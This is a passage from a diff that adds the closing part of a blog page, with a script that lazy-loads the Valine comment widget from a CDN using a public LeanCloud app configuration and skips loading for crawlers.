+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
